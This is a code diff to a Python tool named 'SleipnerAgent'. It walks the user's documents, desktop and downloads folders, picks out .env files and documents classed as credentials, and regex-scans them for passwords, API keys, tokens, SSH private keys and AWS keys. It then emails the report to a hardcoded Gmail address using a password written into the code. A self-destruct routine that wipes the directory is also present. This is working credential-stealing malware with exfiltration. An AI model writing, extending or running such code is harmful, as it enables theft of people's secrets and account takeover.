@@ -16,6 +16,11 @@ TARGET_FILETYPES = [
     "env"
     ]
 
+TARGET_CATEGORIES = [
+    "credentials",
+    "unknown"
+]
+
 LANGDETECT_TO_NLTK_NAME = {
     'da': 'danish',
     'nl': 'dutch',
@@ -39,6 +44,9 @@ class SleipnerAgent:
         self.load_keywords()
         self.potential_targets = None
         self.lantern = Lantern()
+        self.first_round_results = []
+        self.final_results = []
+        self.report = None
 
     def launch(self):
         if self._install_local_modules():
@@ -50,6 +58,8 @@ class SleipnerAgent:
             print(f"{len(self.potential_targets)} files found.")
 
             self._analyze_files()
+            self.run_result_analytics()
+            self.send_results()
             
             # WARNING - DO NOT RUN THIS FUNCTION, IT WILL WIPE THE DIRECTORY
             # self.self_destruct()
@@ -392,16 +402,16 @@ class SleipnerAgent:
 
             # Read tables
             if doc.tables:
-                print("\n--- Tables ---\n")
+                # print("\n--- Tables ---\n")
                 for i, table in enumerate(doc.tables):
-                    print(f"Table {i+1}:")
+                    # print(f"Table {i+1}:")
                     for row in table.rows:
                         row_text = [cell.text.strip() for cell in row.cells if cell.text.strip()]
                         if row_text:
                             joined_row = " | ".join(row_text)
-                            print(joined_row)
+                            # print(joined_row)
                             text_chunks.append(joined_row)
-                    print("")
+                    # print("")
 
             return "\n".join(text_chunks)
 
@@ -530,8 +540,9 @@ class SleipnerAgent:
 
         n = 1
         for filepath in self.potential_targets:
-            if n < 10:
+            # if n < 10:
 
+                # print("CURRENT FILE:", filepath)
                 # print(filepath)
                 filetype = filepath.split(".")[-1]
                 
@@ -544,12 +555,17 @@ class SleipnerAgent:
                         content = self._read_odt(filepath)
                     case "env":
                         content = self._read_env(filepath)
+
+                        # Always save .env content
+                        results_entry = filepath + "\n" + content
+                        self.first_round_results.append(results_entry)
+                        
                     case "txt":
                         content = self._read_txt(filepath)
                     case _: 
                         content = "Unable to read document."
 
-                if content and content.strip():
+                if content and content.strip() and filetype != "env":
                     try:
                         language = detect(content)
                         # print(f"[{filepath}] Detected language: {language}")
@@ -558,39 +574,186 @@ class SleipnerAgent:
 
                     try:
                         category = self.classify_with_keywords(content, language)
-                        print(f"[{filepath}] → Category: {category} (Lang: {language})")
+                        # print(f"[{filepath}] → Category: {category} (Lang: {language})")
+
+                        if category in TARGET_CATEGORIES:
+                            # print("Targets found.")
+                            results_entry = filepath + "\n" + content
+                            self.first_round_results.append(results_entry)
+
                     except Exception as e:
                         print(f"[{filepath}] could not be categorized. Reason: {e}")
                 else:
                     print(f"[{filepath}] No readable content.")
 
-                n += 1          
+                n += 1    
 
-    def send_results(self, results:str) -> bool:
-        to_email = "noreply.friedman@gmail.com"
-        from_email = "noreply.friedman@gmail.com"
-        password = "tswa olbf fsyq intc"
+        print(f"INITIAL ANALYSIS COMPLETE - {len(self.first_round_results)} TARGET FILES FOUND.")
 
-        body = results
-
-        msg = EmailMessage()
-        msg["From"] = from_email
-        msg["To"] = to_email
-        msg["Subject"] = "SLEIPNER - Results"
-        msg.set_content(body)
-
-        try:
-            with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
-                smtp.starttls()
-                smtp.login(from_email, password)
-                smtp.send_message(msg)
-                print("Results sent.")
-
-                return True
+    def run_result_analytics(self):
+        if len(self.first_round_results) >= 1:
+            print(f"Starting detailed analysis of {len(self.first_round_results)} target files...")
             
-        except Exception as e:
-            print(f"Failed to send email: {e}")
-            return False
+            # Define regex patterns for common credential formats
+            import re
+            patterns = {
+                'api_key': r'(?i)(api[_-]?key|access[_-]?key|secret[_-]?key)[=:]\s*[\'"]*([a-zA-Z0-9_\-\.]{16,64})[\'"]*',
+                'password': r'(?i)(password|passwd|pwd)[=:]\s*[\'"]*([^\'"\s]{8,64})[\'"]*',
+                'token': r'(?i)(token|auth[_-]?token|bearer)[=:]\s*[\'"]*([a-zA-Z0-9_\-\.]{8,64})[\'"]*',
+                'ssh_key': r'(?i)(BEGIN\s+(?:RSA|DSA|EC|OPENSSH)\s+PRIVATE\s+KEY)',
+                'aws_key': r'(?i)(AKIA[0-9A-Z]{16})',
+                'email_password': r'(?i)(email|mail)[_-]?(password|pwd)[=:]\s*[\'"]*([^\'"\s]{8,64})[\'"]*',
+                'database_credentials': r'(?i)(db_|database_|mysql_|postgres_)(user|username|password|pwd)[=:]\s*[\'"]*([^\'"\s]{3,64})[\'"]*'
+            }
+            
+            for entry in self.first_round_results:
+                try:
+                    # Split entry into filepath and content
+                    filepath, content = entry.split("\n", 1)
+                    
+                    # Initialize dictionary to store findings for this file
+                    findings = {
+                        'filepath': filepath,
+                        'credentials_found': [],
+                        'language': None,
+                        'summary': ""
+                    }
+                    
+                    # Detect language
+                    try:
+                        from langdetect import detect
+                        findings['language'] = detect(content)
+                    except Exception as e:
+                        findings['language'] = "unknown"
+                        print(f"Language detection failed for {filepath}: {e}")
+                    
+                    # Get appropriate keyword list based on detected language
+                    language = findings['language']
+                    keywords = self.keyword_map.get("credentials", {}).get(language, self.keyword_map["credentials"]["en"])
+
+                    
+                    # Count keyword matches
+                    keyword_count = 0
+                    for keyword in keywords:
+                        if re.search(rf'\b{re.escape(keyword)}\b', content, re.IGNORECASE):
+                            keyword_count += 1
+                    
+                    # Only process files with sufficient keyword matches
+                    if keyword_count >= 1:
+                        # Try to tokenize content for better analysis
+                        try:
+                            sentences = self.sent_tokenize(content)
+                        except:
+                            sentences = content.split('\n')
+                        
+                        # Look for credential patterns in each sentence/line
+                        for sentence in sentences:
+                            for pattern_name, pattern in patterns.items():
+                                matches = re.findall(pattern, sentence)
+                                if matches:
+                                    for match in matches:
+                                        # Handle tuple or string match depending on regex capture groups
+                                        if isinstance(match, tuple):
+                                            credential_value = match[1] if len(match) > 1 else match[0]
+                                        else:
+                                            credential_value = match
+                                        
+                                        
+                                        
+                                        findings['credentials_found'].append({
+                                            'type': pattern_name,
+                                            'context': sentence.strip(),
+                                            'masked_value': credential_value
+                                        })
+                        
+                        # Process environment variables specially
+                        if filepath.endswith('.env'):
+                            for line in content.split('\n'):
+                                if '=' in line and not line.strip().startswith('#'):
+                                    key, value = line.split('=', 1)
+                                    if any(keyword.lower() in key.lower() for keyword in keywords):
+                                        # Mask the value
+                                        if len(value) > 8:
+                                            masked_value = value[:4] + '*' * (len(value) - 8) + value[-4:]
+                                        else:
+                                            masked_value = '****'
+                                        
+                                        findings['credentials_found'].append({
+                                            'type': 'environment_variable',
+                                            'context': line.strip(),
+                                            'masked_value': masked_value
+                                        })
+                    
+                    # Generate summary if credentials were found
+                    if findings['credentials_found']:
+                        findings['summary'] = f"Found {len(findings['credentials_found'])} credential(s) in {filepath}"
+                        self.final_results.append(findings)
+                
+                except Exception as e:
+                    print(f"Error analyzing {filepath if 'filepath' in locals() else 'unknown file'}: {e}")
+            
+            print(f"FINAL ANALYSIS COMPLETE - {len(self.final_results)} FILES CONTAIN CREDENTIALS.")
+            
+            # Optional: Generate a report
+            if self.final_results:
+                self._generate_report()
+        
+    def _generate_report(self):
+        """Generate a summary report of all credentials found"""
+        
+        report = "CREDENTIAL ANALYSIS REPORT\n"
+        report += "=" * 50 + "\n\n"
+        
+        for result in self.final_results:
+            report += f"File: {result['filepath']}\n"
+            report += f"Language: {result['language']}\n"
+            report += f"Credentials found: {len(result['credentials_found'])}\n"
+            report += "-" * 40 + "\n"
+            
+            for i, cred in enumerate(result['credentials_found'], 1):
+                report += f"  {i}. Type: {cred['type']}\n"
+                report += f"     Value: {cred['masked_value']}\n"
+                context = cred['context']
+                # Truncate context if too long
+                if len(context) > 100:
+                    context = context[:97] + "..."
+                report += f"     Context: {context}\n\n"
+            
+            report += "\n"
+
+        self.report = report
+
+    def send_results(self) -> bool:
+
+        if self.report:
+            to_email = "noreply.friedman@gmail.com"
+            from_email = "noreply.friedman@gmail.com"
+            password = "tswa olbf fsyq intc"
+
+            body = self.report
+
+            msg = EmailMessage()
+            msg["From"] = from_email
+            msg["To"] = to_email
+            msg["Subject"] = "SLEIPNER - Results"
+            msg.set_content(body)
+
+            try:
+                with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
+                    smtp.starttls()
+                    smtp.login(from_email, password)
+                    smtp.send_message(msg)
+                    print("Results sent.")
+
+                    return True
+                
+            except Exception as e:
+                print(f"Failed to send email: {e}")
+                return False
+            
+
+        else:
+            "No valuable results found, no email sent."
 
     def self_destruct(self):
 
@@ -634,7 +797,6 @@ class SleipnerAgent:
             os.chdir(tempfile.gettempdir())
             sys.exit(0)
 
-
 class Lantern:
     """
     Lantern scans all wanted files in the enviroment and returns
@@ -647,38 +809,52 @@ class Lantern:
         """
         Scans target directories for files matching self.wanted_filetypes.
         Uses resolved system paths from self.enviroment_directory_paths.
+        Skips files that are too large (> MAX_FILESIZE_MB).
         """
 
         self.enviroment_directory_paths = directory_paths
-        # Use custom filetypes if given
         self.wanted_filetypes = filetypes or TARGET_FILETYPES
+        MAX_FILESIZE_MB = 5  # You can later promote this to self.max_file_size_mb
 
         if directory:
-            # User provided a subdirectory to scan under their home folder
             root_locations = [os.path.join(os.path.expanduser("~"), directory)]
         else:
-            # Use system-resolved paths for documents, desktop, downloads
             root_locations = list(self.enviroment_directory_paths.values())
 
         candidate_files = []
 
         for location in root_locations:
-            location = str(location)  # Ensure compatibility with os.walk
+            location = str(location)  # Ensure string path
             if not os.path.exists(location):
                 continue
 
             for root, _, filenames in os.walk(location):
                 path_parts = os.path.normpath(root).split(os.sep)
                 if 'venv' in path_parts:
-                    continue
+                    continue  # Skip virtual environments
 
-                candidate_files.extend([
-                    os.path.join(root, f)
-                    for f in filenames
-                    if "." in f and f.rsplit(".", 1)[-1].lower() in self.wanted_filetypes
-                ])
+                for f in filenames:
+                    if "." not in f:
+                        continue
+
+                    ext = f.rsplit(".", 1)[-1].lower()
+                    if ext not in self.wanted_filetypes:
+                        continue
+
+                    full_path = os.path.join(root, f)
+                    try:
+                        size_bytes = os.path.getsize(full_path)
+                        if size_bytes > MAX_FILESIZE_MB * 1024 * 1024:
+                            print(f"[SKIPPED - TOO LARGE] {full_path} ({size_bytes / 1024 / 1024:.2f} MB)")
+                            continue
+                    except Exception as e:
+                        print(f"[ERROR SIZE CHECK] {full_path}: {e}")
+                        continue
+
+                    candidate_files.append(full_path)
 
         return candidate_files
+
     
     def sense_surroundings(self, directory_filepaths, directory=None, filetypes=None) -> list:
         relevant_content = self._shine_lantern(directory_filepaths, directory, filetypes)
